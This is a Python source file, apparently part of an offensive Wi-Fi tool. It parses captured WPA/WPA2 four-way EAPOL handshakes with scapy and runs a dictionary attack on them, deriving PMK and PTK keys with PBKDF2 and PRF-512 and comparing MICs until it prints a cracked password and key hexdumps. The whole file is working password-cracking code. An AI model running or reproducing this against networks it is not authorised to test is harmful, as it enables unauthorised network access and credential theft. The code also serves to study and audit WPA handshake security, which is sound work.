import os
import re
import sys
import time
import hmac
import curses
import random
import string
import hashlib
import binascii
import threading
import subprocess
from pull import PULL
from pbkdf2 import PBKDF2
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.utils    import PcapWriter
from scapy.packet   import Raw
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.eap   import EAPOL

pull = PULL()

class CRACK:

	__NULL   = '\x00'
	__PKE    = "Pairwise key expansion"

	__FNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
	__FMIC   = "00000000000000000000000000000000"

	__EAPOLS = {}

	def __init__(self, packets, passes, defer, store, essid):
		self.packets = packets
		self.passes  = passes
		self.defer   = defer
		self.store   = store
		self.essid   = essid

	def extract_elt_layer(self, identifier, pkt):
		layers = pkt.getlayer(Dot11Elt)
		retval = ''
		counter = 0

		try:
			while True:
				layer = layers[counter]
				if hasattr(layer, "ID") and layer.ID == identifier:
					retval = layer.info.decode("utf-8")
					break
				else:
					counter += 1
		except IndexError:
			pass

		return retval

	def extract_sn_rc(self, pkt):
		try:
			sn = pkt.getlayer(Dot11FCS).addr2
			rc = pkt.getlayer(Dot11FCS).addr1
		except:
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1

		return (sn, rc)

	def extract_ds(self, pkt):
		try:
			tds = pkt.getlayer(Dot11FCS).FCfield & 0x1 !=0
			fds = pkt.getlayer(Dot11FCS).FCfield & 0x2 !=0
		except:
			tds = pkt.getlayer(Dot11).FCfield & 0x1 !=0
			fds = pkt.getlayer(Dot11).FCfield & 0x2 !=0

		return (tds, fds)

	def count_shakes(self):
		counter = 0

		for ap in list(self.__EAPOLS.keys()):
			if len(self.__EAPOLS[ap]) == 4:
				counter += 1

		pull.print(
			"*",
			"Handshakes Captured --> Count [{count}]".format(
				count=pull.RED+str(counter)+pull.END
			),
			pull.YELLOW
		)

	def validate(self):
		for pkt in self.packets:
			if pkt.haslayer(EAPOL):
				retval = self.extract_sn_rc(pkt)
				sn     = retval[0]
				rc     = retval[1]

				retval = self.extract_ds(pkt)
				tds    = retval[0]
				fds    = retval[1]

				if fds == True:
					sta = rc
				elif tds == True:
					sta = sn

				if sta not in list(self.__EAPOLS.keys()):
					self.__EAPOLS[ sta ] = {}

				non   = binascii.hexlify(pkt.getlayer(Raw).load)[26:90].decode()
				mic   = binascii.hexlify(pkt.getlayer(Raw).load)[154:186].decode()

				if fds == True:
					if non != self.__FNONCE and mic == self.__FMIC:
						self.__EAPOLS[ rc ][ 1 ] = pkt
					elif non != self.__FNONCE and mic != self.__FMIC:
						self.__EAPOLS[ rc ][ 3 ] = pkt
				elif tds == True:
					if non != self.__FNONCE and mic != self.__FMIC:
						self.__EAPOLS[ sn ][ 2 ] = pkt
					elif non == self.__FNONCE and mic != self.__FMIC:
						self.__EAPOLS[ sn ][ 4 ] = pkt

			elif pkt.haslayer(Dot11Beacon):
				essid = self.extract_elt_layer(0, pkt)
				self.essid = essid

		for sta in list(self.__EAPOLS.keys()):
			if len(self.__EAPOLS[sta]) == 4:
				return True
		return False

	def calculate_hash(self, sta):
		pkts = self.__EAPOLS.get(sta)
		pkta = pkts.get(1)
		pktb = pkts.get(2)
		pktc = pkts.get(3)
		pktd = pkts.get(4)

		mic  = binascii.hexlify(pktb.getlayer(Raw).load)[154:186].decode()
		return mic

	def hexdump(self, src, length=16, sep='.'):
		DISPLAY = string.digits + string.ascii_letters + string.punctuation
		FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
		lines = []
		for c in iter(range(0, len(src), length)):
			chars = src[c:c+length]
			hex = ' '.join(["%02x" % ord(x) for x in chars])
			if len(hex) > 24:
				hex = "%s %s" % (hex[:24], hex[24:])
			printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
			lines.append("%08x:  %-*s  |%s|\n" % (c, length*3, hex, printable))
		return ''.join(lines)

	def organize(self, sta):
		pkts    = self.__EAPOLS.get(sta)
		pkta    = pkts.get(1)
		pktb    = pkts.get(2)
		pktc    = pkts.get(3)
		pktd    = pkts.get(4)

		ap      = self.extract_sn_rc(pktb)[0]

		apbin   = binascii.a2b_hex(ap.replace(":", ""))
		stbin   = binascii.a2b_hex(sta.replace(":", ""))

		anonce  = binascii.a2b_hex(binascii.hexlify(pkta.getlayer(Raw).load)[26:90].decode())
		cnonce  = binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[26:90].decode())

		keydat  = min(apbin, stbin) + max(apbin, stbin) + min(anonce, cnonce) + max(anonce, cnonce)
		version	= chr(pktb.getlayer(EAPOL).version)
		dtype   = chr(pktb.getlayer(EAPOL).type)
		dlen    = chr(pktb.getlayer(EAPOL).len)

		payload = binascii.a2b_hex(
					binascii.hexlify(
						version.encode("utf-8")+
						dtype.encode("utf-8")+
						self.__NULL.encode("utf-8")+
						dlen.encode("utf-8")+
						binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[:154].decode())+
						(self.__NULL * 16).encode("utf-8")+
						binascii.a2b_hex(binascii.hexlify(pktb.getlayer(Raw).load)[186:].decode())
					)
				)

		data    = version.encode("utf-8") + dtype.encode("utf-8") + self.__NULL.encode("utf-8") + dlen.encode("utf-8") + pktb.getlayer(Raw).load

		rtval = (keydat, payload, data)
		return rtval

	def calculate_prf512(self, key, A, B):
		blen = 64
		i    = 0
		R    = b''
		
		while i<=((blen*8+159)/160):
			
			hmacsha1 = hmac.new(
						key, 
						A.encode('utf-8') + chr(0x00).encode('utf-8') + B + chr(i).encode('utf-8'),
						hashlib.sha1
					)
			
			i+=1
			R += hmacsha1.digest()
		
		return R[:blen]

	def compute(self, password, kdata, payload, chash):
		pmk  = PBKDF2(password, self.essid, 4096).read(32)
		ptk  = self.calculate_prf512(pmk, self.__PKE, kdata)

		mica = binascii.hexlify(hmac.new(ptk[0:16], payload, hashlib.md5).digest()).decode()
		micb = binascii.hexlify(hmac.new(ptk[0:16], payload, hashlib.sha1).digest())[:32].decode()

		if mica == chash:
			return (pmk, ptk, mica)
		if micb == chash:
			return (pmk, ptk, micb)

	def engage(self):
		for sta in list(self.__EAPOLS.keys()):
			pull.print(
				"^",
				"Cracking TGT [{target}] Passes [{passes}]".format(
					target=pull.DARKCYAN+sta.upper()+pull.END,
					passes=pull.DARKCYAN+str(len(self.passes))+pull.END
				),
				pull.DARKCYAN
			)

			rtval   = self.organize( sta )
			kdata   = rtval[0]
			payload = rtval[1]
			data    = rtval[2]
			chash   = self.calculate_hash( sta )

			for password in self.passes:
				cracked = self.compute(password, kdata, payload, chash)
				if cracked:
					pull.print(
						"$",
						"Cracked: [{password}]".format(
							password=pull.GREEN+password+pull.END
						),
						pull.GREEN
					)
					print(self.hexdump(cracked[0]))
					print(self.hexdump(cracked[1]))
					print(self.hexdump(cracked[2]))
				else:
					pull.print(
						"*",
						"Checked: [{password}]".format(
							password=password
						),
						pull.RED
					)